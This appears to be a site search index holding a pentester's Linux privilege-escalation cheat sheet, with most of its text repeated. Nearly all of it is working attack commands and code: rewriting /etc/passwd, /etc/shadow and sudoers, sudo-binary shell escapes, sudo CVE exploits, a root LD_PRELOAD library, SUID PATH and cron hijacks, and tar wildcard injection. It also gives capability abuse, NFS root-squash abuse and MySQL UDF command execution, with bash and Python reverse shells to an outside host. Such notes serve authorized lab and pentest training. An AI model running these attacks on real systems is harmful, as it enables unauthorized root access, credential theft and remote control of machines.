{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Nothing to show \u00b6","title":"0x5h1n0k0"},{"location":"#nothing-to-show","text":"","title":"Nothing to show"},{"location":"notes/privilege-escalation/linux/","tags":["Privilege Escalation","Linux"],"text":"Linux Privilege Escalation \u00b6 Privilege Escalation Methods \u00b6 Basic System Enumeration Bash History OpenVPN Credentials Credentials in tcpdump files Writable Files SSH Private Keys Kernel Expliots Sudo -l Sudo CVE Sudo LD_PRELOAD SUID / GUID Binaries SUID PATH Environmental Variable Cron Tabs & Scheduled Tasks Capabilities (Python - Perl - Tar - OpenSSL) NFS Root Squashing chkrootkit 0.49 Tmux (Attach Session) Screen (Attach Session) MySQL Running as root MySQL UDF (User-Defined Functions) Code (UDF) Injection Basic System Enumeration \u00b6 uname -a hostname lscpu ls / home ls / var / www / html ls / var / www / ps aux | grep root netstat -tulpn ps -aux | grep root | grep mysql ifconfig find . -type f -exec grep -i -I \"PASSWORD=\" {} / dev / null \\; locate pass | more Bash History \u00b6 history cat / home /< user >/. bash_history cat ~/. bash_history | grep -i passw OpenVPN Credentials \u00b6 locate *. ovpn Credentials in tcpdump files \u00b6 tcpdump -nt -r capture . pcap -A 2 >/ dev / null | grep -P 'pwd=' Writable Password Files \u00b6 If you have write permission to the following files: /etc/passwd /etc/shadow /etc/sudoers With /etc/passwd echo 'root2::0:0::/root:/bin/bash' >> / etc / passwd su - root2 id && whoami // Add new user to the system with GID and UID of 0 OR vi / etc / passwd Remote X ( Password Holder ) for root wg ! su root id && whoami // Remove root ' s password OR echo root :: 0 : 0 : root :/ root :/ bin / bash > / etc / passwd id && whomai OR openssl passwd - 1 -salt ignite NewRootPassword Copy output echo \"root2:<output>:0:0:root:/root:/bin/bash\" >> / etc / passwd Replace < output > with the copied output su root2 id && whoami With /etc/shadow Run python -c \"import crypt; print crypt.crypt('NewRootPassword')\" Copy the output vi / etc / shadow Replace root ' s hash with the output that you generated wq ! su root id && whoami With /etc/sudoers echo \"<username> ALL=(ALL:ALL) ALL\" >> / etc / sudoers // Replace \"Username\" with your current user ( Example : www-data ) sudo su id && whoami ``` # SSH Private Keys ``` ps1 find / -name authorized_keys 2 > / dev / null // Any Public Keys ? find / -name id_rsa 2 > / dev / null // Any SSH private keys ? Copy id_rsa contents of keys found with the above command Create a local file on your box and paste the content in chmod 600 < local_file > ssh -i < local_file > user @IP // Is the key password protected ? ssh2john < local_file > > hash john hash - -wordlist =/ usr / share / wordlists / rockyou . txt Kernel Expliots \u00b6 uname -a // What OS kernel are we using ? // Google Search ( Example ): 4 . 4 . 0 - 116-generic #140-Ubuntu Expliots OR 4.4.0-116-generic #140-Ubuntu PoC github // Read the expliots and follow the instructions // Popular Linux Kernel Exploits Dirty COW ( CVE - 2016 - 5195 ) URL : https :// dirtycow . ninja / Other Kernel Expliots URL : https :// github . com / SecWiki / linux-kernel-exploits Sudo -l \u00b6 Sudo -l What binaries can we execute with Sudo? Example Output User www-data may run the following commands on (root) NOPASSWD: /usr/bin/find (root) NOPASSWD: /usr/bin/nmap (root) NOPASSWD: /usr/bin/env (root) NOPASSWD: /usr/bin/vim (root) NOPASSWD: /usr/bin/awk (root) NOPASSWD: /usr/bin/perl (root) NOPASSWD: /usr/bin/python (root) NOPASSWD: /usr/bin/less (root) NOPASSWD: /usr/bin/man (root) NOPASSWD: /usr/bin/ftp (root) NOPASSWD: /usr/bin/socat (root) NOPASSWD: /usr/bin/zip (root) NOPASSWD: /usr/bin/gcc (root) NOPASSWD: /usr/bin/docker (root) NOPASSWD: /usr/bin/env (root) NOPASSWD: /usr/bin/MySQL (root) NOPASSWD: /usr/bin/ssh (root) NOPASSWD: /usr/bin/tmux (root) NOPASSWD: /usr/bin/pkexec (root) NOPASSWD: /usr/bin/rlwrap (root) NOPASSWD: /usr/bin/xargs (root) NOPASSWD: /usr/bin/anansi_util (root) NOPASSWD: /usr/bin/apt-get (root) NOPASSWD: /usr/bin/flask run (root) NOPASSWD: /usr/bin/apache2 (root) NOPASSWD: /usr/bin/wget Absuing Sudo binaries to gain root \u00b6 find sudo find / etc / passwd -exec / bin / bash \\; Nmap echo \"os.execute('/bin/bash/')\" > / tmp / shell . nse && sudo nmap - -script =/ tmp / shell . nse Env sudo env / bin / bash Vim sudo vim -c ':!/bin/bash' Awk sudo awk 'BEGIN {system(\"/bin/bash\")}' Perl sudo perl -e 'exec \"/bin/bash\";' Python sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' Less sudo less / etc / hosts - ! bash Man sudo man man - ! bash ftp sudo ftp - ! / bin / bash socat Attacker = socat file :` tty `, raw , echo = 0 tcp-listen : 1234 Victim = sudo socat exec : 'sh -li' , pty , stderr , setsid , sigint , sane tcp : 192 . 168 . 1 . 105 : 1234 Zip echo test > notes . txt sudo zip test . zip notes . txt -T - -unzip-command = \"sh -c /bin/bash\" gcc sudo gcc -wrapper / bin / bash , -s . Docker sudo docker run -v /:/ mnt - -rm -it alpine chroot / mnt sh MySQL sudo mysql -e '\\! /bin/sh' SSH sudo ssh -o ProxyCommand = ';sh 0<&2 1>&2' x Tmux Sudo tmux pkexec sudo pkexec / bin / bash rlwrap sudo rlwrap / bin / bash xargs sudo xargs -a / dev / null sh anansi_util sudo / home / anansi / bin / anansi_util manual / bin / bash apt-get sudo apt-get update -o APT :: Update :: Pre-Invoke ::= \u201d / bin / bash -i \u201d flask run echo 'import pty; pty.spawn(\u201c/bin/bash\u201d)' > flask . py export FLASK_APP = flask . py sudo / usr / bin / flask run apache2 Victim sudo apache2 -f / etc / shadow Copy root ' s hash Attacker echo '<root' s_hash > ' > hash john hash --wordlist=/usr/share/wordlists/rockyou.txt // Replace <root' s_hash > with the hash that you copied Back to Victim su root id && whoami Wget Victim cp / etc / passwd / tmp / passwd cat / etc / passwd Attacker Copy / etc / passwd content and put in a local file called passwd Run python -c \"import crypt; print crypt.crypt('NewRootPassword')\" Copy output of the above command edit passwd Replace x in root ' s line with the copied output Save the file python -m SimpleHTTPServer 9000 // You can use any port Victim sudo wget http ://< attacker_ip >: 9000 / passwd -O / etc / passwd su root // Enter the new root password you generated ( Example : NewRootPassword ) id && whoami Sudo CVE \u00b6 \u1ebcploit sudo with known CVE CVE: CVE-2019-14287 CVE-2019-16634 CVE-2019-14287 \u00b6 sudo -V // Get sudo version sudo -l Vulnerable output Output = (ALL,!root) NOPASSWD: /bin/bash sudo -u #-1 /bin/bash id && whoami CVE-2019-16634 \u00b6 sudo -V // Get sudo version sudo su root // If you type root's password , can you see the *****? // That means pw_feedback is enabled Expliot PoC: https://github.com/saleemrashid/sudo-cve-2019-18634 Download expliot.c Upload to Victim Attacker python -m SimpleHTTPServer 9000 // You can use any port Victim wget http ://< attacker_ip >: 9000 / expliot . c Compile expliot . c : gcc expliot . c -o expliot ./ expliot id && whoami Sudo LD_PRELOAD \u00b6 sudo -l Example Output: env_reset, env_keep+=LD_PRELOAD // Do you have the same output with sudo binary rights? Expliot cd / tmp vi priv . c #include <stdio.h> #include <sys/types.h> #include <stdlib.h> void _init () { unsetenv ( \"LD_PRELOAD\" ); setgid ( 0 ); setuid ( 0 ); system ( \"/bin/bash\" ); } Compile priv . c : gcc -fPIC -shared -o priv . so priv . c -nostartfiles Command : sudo LD_PRELOAD =/ tmp / priv . so awk // awk can be replaced with any sudo binary SUID / GUID Binaries Overview \u00b6 SUID: Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user. Those files which have suid permissions run with higher privileges. Assume we are accessing the target system as a non-root user and we found suid bit enabled binaries, then those file/program/command can run with root privileges. Basically, you can change the permission of any file either using the \u201cNumerical\u201d method or \u201cSymbolic\u201d method. As result, it will replace x from s as shown in the below image which denotes especial execution permission with the higher privilege to a particular file/command. Since we are enabling SUID for Owner (user) therefore bit 4 or symbol s will be added before read/write/execution operation. Basic Enumeration GUID permission is similar to the SUID permission, only difference is \u2013 when the script or command with SGID on is run, it runs as if it were a member of the same group in which the file is a member Enumeration: find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l find / -perm -g = s -type f 2 >/ dev / null | xargs ls -l find / -perm - 4000 -type f -exec ls -la {} 2 >/ dev / null \\; find / -uid 0 -perm - 4000 -type f 2 >/ dev / null // Look for any binaries that seem odd . Any binaries running from a users home directory ? // Check the version of any odd binaries and see if there are any public expliots that can be used to gain root SUID PATH Environmental Variable \u00b6 PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored. When the user run any command on the terminal, its request to the shell to search for executable files with the help of PATH Variable in response to commands executed by a user. The superuser also usually has /sbin and /usr/sbin entries for easily executing system administration commands. View PATH echo $PATH env | grep PATH print $PATH Example 1 Create a Simple Basic SUID binary cd / home / max / vi test . c #include<unistd.h> void main () { setuid ( 0 ); setgid ( 0 ); system ( \"curl -I 127.0.0.1\" ); } Compile Binary & Add SUID Bit gcc test . c -o network-tester chmod u + s network-tester mv network-tester / bin / tools / Example 1 (Without full bin path) Privilege Escalation Find the SUID Binary find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l Output Example : / bin / tools / network-tester ls -la / bin / tools / network-tester Test the SUID Binary / bin / tools / network-tester strings / bin / tools / network-tester Output Example : curl -I 127 . 0 . 0 . 1 Absue the SUID Binary echo \"/bin/bash\" > / tmp / curl chmod 777 / tmp / curl echo $PATH export PATH =/ tmp : $PATH / bin / tools / network-tester id && whoami Example 3 (Without full bin path) Privilege Escalation Find the SUID Binary find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l Output Example : / bin / tools / webserver-status ls -la / bin / tools / webserver-status Test the SUID Binary / bin / tools / webserver-status strings / bin / tools / webserver-status Output Example : service apache2 status Absue the SUID Binary echo 'int mian() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0;}' > / tmp / service . c gcc / tmp / service . c -o / tmp / service chmod 777 / tmp / service export PATH =/ tmp : $PATH echo $PATH / bin / tools / webserver-status id && whoami Example 4 (With full bin path) Privilege Escalation Find the SUID Binary find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l Output Example : / bin / tools / webserver-status ls -la / bin / tools / webserver-status Test the SUID Binary / bin / tools / webserver-status strings / bin / tools / webserver-status Output Example : / usr / sbin / service apache2 status Absue the SUID Binary fucntion / usr / sbin / service () { cp / bin / bash / tmp && chmod + s / tmp / bash && / tmp / bash -p ; } export -f / usr / sbin / service / bin / tools / webserver-status id && whoami Example 5 (/bin/systemctl) Privilege Escalation Copy line by line inside the victim low priv shell TF =$( mktemp ). service echo '[Service] Type=oneshot ExecStart=/bin/sh -c \"chmod +s /bin/bash > /tmp/output\" [Install] WantedBy=multi-user.target' > $TF systemctl link $TF systemctl enable - -now $TF / bin / bash -p id && whoami Example 5 (Copy - /bin/cp) Privilege Escalation Victim find / -perm -u = s -type f 2 >/ dev / null | xargs ls -l Copy the contents of / etc / passwd to your local machine inside a new file called \"passwd\" Attacker Run the following command locally : openssl passwd - 1 -salt ignite NewRootPassword Copy the output Add the following inside the local passwd file echo \"root2:<output>:0:0:root:/root:/bin/bash\" >> passwd // Replace < output > with the copied output python -m SimpleHTTPServer 9000 Victim wget -O / tmp / passwd http :// 10 . 10 . 10 . 10 : 9000 / passwd cp / tmp / passwd / etc / passwd su root2 Password : NewRootPassword id && whoami // Replace Attacker IP & Port Cron Tabs & Scheduled Tasks \u00b6 Cron jobs is a time-based job scheduler in Unix-like computer operating systems. Users that set up and maintain software environments use cron to schedule jobs to run periodically at fixed times, dates, or intervals Enumeration contab -l / etc / init . d / etc / cron * / etc / crontab / etc / cron . allow / etc / cron . d / etc / cron . deny / etc / cron . daily / etc / cron . hourly / etc / cron . monthly / etc / cron . weekly Example 1 Privilege Escalation via Nonexistent File Overwrite cat / etc / crontab Output Example : * * * * * root systemupdate . sh echo 'chmod +s /bin/bash' > / home / user / systemupdate . sh chmod + x / home / user / systemupdate . sh Wait a while / bin / bash -p id && whoami Example 2 Privilege Escalation via Root Executable Bash Script cat / etc / crontab Output Example : * * * * * root / usr / bin / local / network-test . sh echo \"chmod +s /bin/bash\" >> / usr / bin / local / network-test . sh Wait a while id && whomai Example 3 Privilege Escalation via Root Executable Python Script Overwrite Target cat / etc / crontab Output Example : * * * * * root / var / www / html / web-backup . py cd / var / www / html / vi web-backup . py Add the below to the script : import socket import subprocess import os s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ); s . connect (( \"10.10.10.10\" , 443 )); os . dup2 ( s . fileno (), 0 ); os . dup2 ( s . fileno (), 1 ); os . dup2 ( s . fileno (), 2 ); p = subprocess . call ([ \"/bin/bash\" , \"-i\" ]); // Replace the IP & Port // Save & Exit the Script Attacker nc -lvnp 443 OR Target cat / etc / crontab Output Example : * * * * * root / var / www / html / web-backup . py cd / var / www / html / vi web-backup . py Add the below to the script : import os os . system ( \"chmod +s /bin/bash\" ) // Save & Exit the Script Wait a While / bin / bash -p id && whoami Example 4 Privilege Escalation via Tar Bash Script (WildCards) cat / etc / crontab Output Example : * * * * * root / usr / bin / local / mysql-db-backup . sh cat / usr / bin / local / mysql-db-backup . sh Output of Script : -------------------------------- #!/bin/bash cd / var / www / html / tar czf / tmp / dbbackup . tar . gz * -------------------------------- cd / var / www / html / echo \"#!/bin/bash\" > priv . sh echo \"chmod +s /bin/bash\" >> priv . sh chmod + x priv . sh touch / var / www / html /- -checkpoint = 1 touch / var / www / html /- -checkpoint-action = exec = sh \\ priv . sh Wait a while / bin / bash -p id && whomai Example 5 Privilege Escalation via Tar Cron Job cat / etc / crontab Output Example : */ 1 * * * * root tar -zcf / var / backups / html . tgz / var / www / html /* cd / var / www / html / echo \"chmod +s /bin/bash\" > priv . sh echo \"\" > \"--checkpoint-action=exec=bash priv.sh echo \"\" > --checkpoint=1 tar cf archive.tar * // If it does not work , replace \" bash \" with \" sh \" Capabilities \u00b6 Linux capabilities are special attributes in the Linux kernel that grant processes and binary executables specific privileges that are normally reserved for processes whose effective user ID is 0 (The root user, and only the root user, has UID 0). Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks. Essentially, the goal of capabilities is to divide the power of 'root' into specific privileges, so that if a process or binary that has one or more capability is exploited, the potential damage is limited when compared to the same process running as root. Capabilities can be set on processes and executable files. A process resulting from the execution of a file can gain the capabilities of that file. Python Perl Tar OpenSSL Python getcap -r / 2 >/ dev / null / usr / bin / python2 . 6 = cap_setuid + ep / usr / bin / python2 . 6 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' id && whoami OR getcap -r / 2 >/ dev / null / usr / bin / python3 = cap_setuid + ep / usr / bin / python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' id && whoami Perl getcap -r / 2 >/ dev / null / usr / bin / perl = cap_setuid + ep / usr / bin / perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";' id && whoami Tar Method 1 Victim getcap -r / 2 >/ dev / null / usr / bin / tar = cap dac read search + ep / usr / bin / tar -cvf shadow . tar / etc / shadow / usr / bin / tar -xvf shadow . tar cat etc / shadow Copy content of users accounts to a local file called shadow Attacker john shadow - -wordlist =/ usr / share / wordlists / rockyou . txt Crack root ' s credentials Victim su root id && whoami Method 2 Victim getcap -r / 2 >/ dev / null / usr / bin / tar = cap dac read search + ep / usr / bin / tar -cvf key . tar / root /. ssh / id_rsa / usr / bin / tar -xvf key . tar cat id_rsa # Download id_rsa to attacker machine Attacker chmod 600 id_rsa ssh -i id_rsa root @< victim_ip > id && whoami OpenSSL Victim getcap -r / 2 >/ dev / null / usr / bin / openssl = cap_setuid + ep Attacker Create a .so file - Code below vi priv.c #include <openssl/engine.h> #include <stdio.h> #include <stdlib.h> #include <sys/types.h> #include <unistd.h> static const char * engine_id = \"test\" ; static const char * engine_name = \"hope it works\" ; static int bind ( ENGINE * e , const char * id ) { int ret = 0 ; if (! ENGINE_set_id ( e , engine_id )) { fprintf ( stderr , \"ENGINE_set_id failed\\n\" ); goto end ; } if (! ENGINE_set_name ( e , engine_name )) { printf ( \"ENGINE_set_name failed\\n\" ); goto end ; } setuid ( 0 ); setgid ( 0 ); system ( \"chmod +s /bin/bash\" ); system ( \"echo Complete!\" ); ret = 1 ; end : return ret ; } IMPLEMENT_DYNAMIC_BIND_FN ( bind ) IMPLEMENT_DYNAMIC_CHECK_FN () Compile Code & Create .so file gcc -c fPIC priv . c -o priv gcc -shared -o priv . so -lcrypto priv Victim Download .so from Attacker wget -O / tmp / priv . so http :// 10 . 10 . 10 . 10 : 9000 / priv . so // Replace IP & Port Get Root openssl req -engine /tmp/priv.so /bin/bash -p id && whoami NFS Root Squashing \u00b6 Network File System (NFS): Network File System permits a user on a client machine to mount the shared files or directories over a network. NFS uses Remote Procedure Calls (RPC) to route requests between clients and servers. Although NFS uses TCP/UDP port 2049 for sharing any files/directories over a network. rw: Permit clients to read as well as write access to the shared directory. ro: Permit clients to Read-only access to shared directory. root_squash: This option Prevents file request made by user root on the client machine because NFS shares change the root user to the nfsnobody user, which is an unprivileged user account. no_root_squash: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implication. async: It will speed up transfers but can cause data corruption as NFS server doesn\u2019t wait for the complete write operation to be finished on the stable storage, before replying to the client. sync: The sync option does the inverse of async option where the NFS server will reply to the client only after the data is finally written to the stable storage. Enumeration Victim cat / etc / exports // Do we see any no_root_squash enabled on a mounted share ? / tmp *( rw , sync , insecure , no_root_squash , no , subtree , check ) Attacker nmap -sV - -script = nfs-showmount < victim_ip > Privilege Escalation Attacker showmount -e < victim_ip > mkdir / tmp / mount mount -o rw , vers = 2 < victim_ip >:/ tmp / tmp / mount echo 'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }' > / tmp / mount / priv . c gcc / tmp / mount / priv . c -o / tmp / mount / priv chmod + s / tmp / mount / priv OR showmount -e < victim_ip > mkdir / tmp / mount mount -o rw , vers = 2 < victim_ip >:/ tmp / tmp / mount cd / tmp / mount cp / bin / bash . chmod + s bash Victim cd / tmp ./ priv id && whoami OR cd / tmp ./ bash -p id && whoami chkrootkit 0.49 \u00b6 Expliot: https://www.exploit-db.com/exploits/33899 cat /etc/cron.daily /usr/bin/chkrootkit ls -la /usr/bin/chkrootkit // Do we have SUID? chkrootkit -V echo \"#!/bin/bash\" > /tmp/update echo \"chmod +s /bin/bash\" >> /tmp/update Wait a While ... /bin/bash -p id && whoami Tmux \u00b6 tmux is a terminal multiplexer for Unix-like operating systems. It allows multiple terminal sessions to be accessed simultaneously in a single window. It is useful for running more than one command-line program at the same time. Tmux Cheat Sheet: https://tmuxcheatsheet.com/ Privilege Escalation tmux list-sessions // Any Tmux sessions running as root? /tmp/tmux-14/default-root // Root Tmux Session tmux -S /tmp/tmux-14/default-root // Replace Path to Socket (Depending on your results) OR tmux list-sessions // Any Tmux sessions running as root? /tmp/tmux-14/default-root // Root Tmux Session tmux -S /opt/.dev/gbm/ attach -t 0 // Replace Path to Session (Depending on your results) MySQL Running as root \u00b6 Example 1 ps aux | grep root mysql -u root -p \\! chmod + s / bin / bash exit ls -la / bin / bash // Verify that the SUID bit is set / bin / bash -p id && whoami Example 2 Victim ps aux | grep root mysql -u root -p \\! bash -i >& / dev / tcp / 10 . 10 . 10 . 10 / 9999 0 >& 1 Attacker nc -lvnp 9999 id && whoami MySQL UDF (User-Defined Functions) Code (UDF) Injection \u00b6 User Defined Function (UDF) is a piece of code that extends the functionality of a MySQL server by adding a new function that behaves just like a native (built-in) MySQL function, such as abs() or concat() UDFs are useful when you need to extend the functionality of your MySQL server For penetration testing, we can include a UDF inside our database that loads a library that has the ability to execute commands via the sys_exec() function which gives us code execution Example 1 - Reverse Shell Download UDF (Linux - 64 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64 Download UDF (Linux - 32 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32 Victim ps aux | grep root // Verify that MySQL is running as root Save the UDF in the / tmp folder ( Example : / tmp / lib_mysqludf_sys . so ) mysql -u root -p mysql > use mysql ; mysql > create table admin ( line blob ); mysql > insert into admin values ( load_file ( '/tmp/lib_mysqludf_sys.so' )); mysql > select * from admin into dumpfile '/usr/lib/lib_mysqludf_sys.so' ; mysql > create function sys_exec returns integer soname 'lib_mysqludf_sys.so' ; mysql > select sys_exec ( 'bash -i >& /dev/tcp/10.10.10.10/9999 0>&1' ); // Any UDF library can be used , as long as it is exploitable via the sys_exec () function // The \"admin\" table name can be named anything // Ensure that the path to the UDF (. so ) is correct // Replace IP & Port Attacker nc -lvnp 9999 Example 2 (Local via SUID) Download UDF (Linux - 64 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64 Download UDF (Linux - 32 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32 Victim ps aux | grep root // Verify that MySQL is running as root Save the UDF in the / tmp folder ( Example : / tmp / lib_mysqludf_sys . so ) mysql -u root -p mysql > use mysql ; mysql > create table admin ( line blob ); mysql > insert into admin values ( load_file ( '/tmp/lib_mysqludf_sys.so' )); mysql > select * from admin into dumpfile '/usr/lib/lib_mysqludf_sys.so' ; mysql > create function sys_exec returns integer soname 'lib_mysqludf_sys.so' ; mysql > select sys_exec ( 'chmod +s /bin/bash' ); mysql > exit Wait a while ls -la / bin / bash // Verify that the SUID bit is set / bin / bash -p id && whoami Example 3 (Explioting MySQL 4.x/5.0 (Linux)) UDF Link: https://www.exploit-db.com/exploits/1518 Victim wget -O priv . c https :// www . exploit-db . com / download / 1518 gcc \u2013 g \u2013 shared \u2013 Wl , \u2013 soname , priv . so \u2013 o priv . so priv . c \u2013 lc chmod 777 priv . so mv priv . so / tmp / mysql -u root -p mysql > create table priv ( line blob ); mysql > insert into priv values ( load_file ( \u2018 / tmp / priv . so \u2019 )); mysql > select * from priv into dumpfile \u2018 / usr / lib / mysql / plugin / priv . so \u2019 ; mysql > create function do_system returns integer soname \u2018 priv . so \u2019 ; mysql > select do_system ( \u2018 chmod + s / bin / bash \u2019 ); mysql >! sh / bin / bash -p id && whoami // priv . c can be called anything // The \"priv\" table name can be named anything // Ensure that the path to the UDF (. so ) is correct // Replace IP & Port","title":"Linux Privilege Escalation"},{"location":"notes/privilege-escalation/linux/#linux-privilege-escalation","text":"","title":"Linux Privilege Escalation"},{"location":"notes/privilege-escalation/linux/#privilege-escalation-methods","text":"Basic System Enumeration Bash History OpenVPN Credentials Credentials in tcpdump files Writable Files SSH Private Keys Kernel Expliots Sudo -l Sudo CVE Sudo LD_PRELOAD SUID / GUID Binaries SUID PATH Environmental Variable Cron Tabs & Scheduled Tasks Capabilities (Python - Perl - Tar - OpenSSL) NFS Root Squashing chkrootkit 0.49 Tmux (Attach Session) Screen (Attach Session) MySQL Running as root MySQL UDF (User-Defined Functions) Code (UDF) Injection","title":"Privilege Escalation Methods"},{"location":"notes/privilege-escalation/linux/#basic-system-enumeration","text":"uname -a hostname lscpu ls / home ls / var / www / html ls / var / www / ps aux | grep root netstat -tulpn ps -aux | grep root | grep mysql ifconfig find . -type f -exec grep -i -I \"PASSWORD=\" {} / dev / null \\; locate pass | more","title":"Basic System Enumeration"},{"location":"notes/privilege-escalation/linux/#bash-history","text":"history cat / home /< user >/. bash_history cat ~/. bash_history | grep -i passw","title":"Bash History"},{"location":"notes/privilege-escalation/linux/#openvpn-credentials","text":"locate *. ovpn","title":"OpenVPN Credentials"},{"location":"notes/privilege-escalation/linux/#credentials-in-tcpdump-files","text":"tcpdump -nt -r capture . pcap -A 2 >/ dev / null | grep -P 'pwd='","title":"Credentials in tcpdump files"},{"location":"notes/privilege-escalation/linux/#writable-password-files","text":"If you have write permission to the following files: /etc/passwd /etc/shadow /etc/sudoers With /etc/passwd echo 'root2::0:0::/root:/bin/bash' >> / etc / passwd su - root2 id && whoami // Add new user to the system with GID and UID of 0 OR vi / etc / passwd Remote X ( Password Holder ) for root wg ! su root id && whoami // Remove root ' s password OR echo root :: 0 : 0 : root :/ root :/ bin / bash > / etc / passwd id && whomai OR openssl passwd - 1 -salt ignite NewRootPassword Copy output echo \"root2:<output>:0:0:root:/root:/bin/bash\" >> / etc / passwd Replace < output > with the copied output su root2 id && whoami With /etc/shadow Run python -c \"import crypt; print crypt.crypt('NewRootPassword')\" Copy the output vi / etc / shadow Replace root ' s hash with the output that you generated wq ! su root id && whoami With /etc/sudoers echo \"<username> ALL=(ALL:ALL) ALL\" >> / etc / sudoers // Replace \"Username\" with your current user ( Example : www-data ) sudo su id && whoami ``` # SSH Private Keys ``` ps1 find / -name authorized_keys 2 > / dev / null // Any Public Keys ? find / -name id_rsa 2 > / dev / null // Any SSH private keys ? Copy id_rsa contents of keys found with the above command Create a local file on your box and paste the content in chmod 600 < local_file > ssh -i < local_file > user @IP // Is the key password protected ? ssh2john < local_file > > hash john hash - -wordlist =/ usr / share / wordlists / rockyou . txt","title":"Writable Password Files"},{"location":"notes/privilege-escalation/linux/#kernel-expliots","text":"uname -a // What OS kernel are we using ? // Google Search ( Example ): 4 . 4 . 0 - 116-generic #140-Ubuntu Expliots OR 4.4.0-116-generic #140-Ubuntu PoC github // Read the expliots and follow the instructions // Popular Linux Kernel Exploits Dirty COW ( CVE - 2016 - 5195 ) URL : https :// dirtycow . ninja / Other Kernel Expliots URL : https :// github . com / SecWiki / linux-kernel-exploits","title":"Kernel Expliots"},{"location":"notes/privilege-escalation/linux/#sudo-l","text":"Sudo -l What binaries can we execute with Sudo? Example Output User www-data may run the following commands on (root) NOPASSWD: /usr/bin/find (root) NOPASSWD: /usr/bin/nmap (root) NOPASSWD: /usr/bin/env (root) NOPASSWD: /usr/bin/vim (root) NOPASSWD: /usr/bin/awk (root) NOPASSWD: /usr/bin/perl (root) NOPASSWD: /usr/bin/python (root) NOPASSWD: /usr/bin/less (root) NOPASSWD: /usr/bin/man (root) NOPASSWD: /usr/bin/ftp (root) NOPASSWD: /usr/bin/socat (root) NOPASSWD: /usr/bin/zip (root) NOPASSWD: /usr/bin/gcc (root) NOPASSWD: /usr/bin/docker (root) NOPASSWD: /usr/bin/env (root) NOPASSWD: /usr/bin/MySQL (root) NOPASSWD: /usr/bin/ssh (root) NOPASSWD: /usr/bin/tmux (root) NOPASSWD: /usr/bin/pkexec (root) NOPASSWD: /usr/bin/rlwrap (root) NOPASSWD: /usr/bin/xargs (root) NOPASSWD: /usr/bin/anansi_util (root) NOPASSWD: /usr/bin/apt-get (root) NOPASSWD: /usr/bin/flask run (root) NOPASSWD: /usr/bin/apache2 (root) NOPASSWD: /usr/bin/wget","title":"Sudo -l"},{"location":"notes/privilege-escalation/linux/#absuing-sudo-binaries-to-gain-root","text":"find sudo find / etc / passwd -exec / bin / bash \\; Nmap echo \"os.execute('/bin/bash/')\" > / tmp / shell . nse && sudo nmap - -script =/ tmp / shell . nse Env sudo env / bin / bash Vim sudo vim -c ':!/bin/bash' Awk sudo awk 'BEGIN {system(\"/bin/bash\")}' Perl sudo perl -e 'exec \"/bin/bash\";' Python sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' Less sudo less / etc / hosts - ! bash Man sudo man man - ! bash ftp sudo ftp - ! / bin / bash socat Attacker = socat file :` tty `, raw , echo = 0 tcp-listen : 1234 Victim = sudo socat exec : 'sh -li' , pty , stderr , setsid , sigint , sane tcp : 192 . 168 . 1 . 105 : 1234 Zip echo test > notes . txt sudo zip test . zip notes . txt -T - -unzip-command = \"sh -c /bin/bash\" gcc sudo gcc -wrapper / bin / bash , -s . Docker sudo docker run -v /:/ mnt - -rm -it alpine chroot / mnt sh MySQL sudo mysql -e '\\! /bin/sh' SSH sudo ssh -o ProxyCommand = ';sh 0<&2 1>&2' x Tmux Sudo tmux pkexec sudo pkexec / bin / bash rlwrap sudo rlwrap / bin / bash xargs sudo xargs -a / dev / null sh anansi_util sudo / home / anansi / bin / anansi_util manual / bin / bash apt-get sudo apt-get update -o APT :: Update :: Pre-Invoke ::= \u201d / bin / bash -i \u201d flask run echo 'import pty; pty.spawn(\u201c/bin/bash\u201d)' > flask . py export FLASK_APP = flask . py sudo / usr / bin / flask run apache2 Victim sudo apache2 -f / etc / shadow Copy root ' s hash Attacker echo '<root' s_hash > ' > hash john hash --wordlist=/usr/share/wordlists/rockyou.txt // Replace <root' s_hash > with the hash that you copied Back to Victim su root id && whoami Wget Victim cp / etc / passwd / tmp / passwd cat / etc / passwd Attacker Copy / etc / passwd content and put in a local file called passwd Run python -c \"import crypt; print crypt.crypt('NewRootPassword')\" Copy output of the above command edit passwd Replace x in root ' s line with the copied output Save the file python -m SimpleHTTPServer 9000 // You can use any port Victim sudo wget http ://< attacker_ip >: 9000 / passwd -O / etc / passwd su root // Enter the new root password you generated ( Example : NewRootPassword ) id && whoami","title":"Absuing Sudo binaries to gain root"},{"location":"notes/privilege-escalation/linux/#sudo-cve","text":"\u1ebcploit sudo with known CVE CVE: CVE-2019-14287 CVE-2019-16634","title":"Sudo CVE"},{"location":"notes/privilege-escalation/linux/#cve-2019-14287","text":"sudo -V // Get sudo version sudo -l Vulnerable output Output = (ALL,!root) NOPASSWD: /bin/bash sudo -u #-1 /bin/bash id && whoami","title":"CVE-2019-14287"},{"location":"notes/privilege-escalation/linux/#cve-2019-16634","text":"sudo -V // Get sudo version sudo su root // If you type root's password , can you see the *****? // That means pw_feedback is enabled Expliot PoC: https://github.com/saleemrashid/sudo-cve-2019-18634 Download expliot.c Upload to Victim Attacker python -m SimpleHTTPServer 9000 // You can use any port Victim wget http ://< attacker_ip >: 9000 / expliot . c Compile expliot . c : gcc expliot . c -o expliot ./ expliot id && 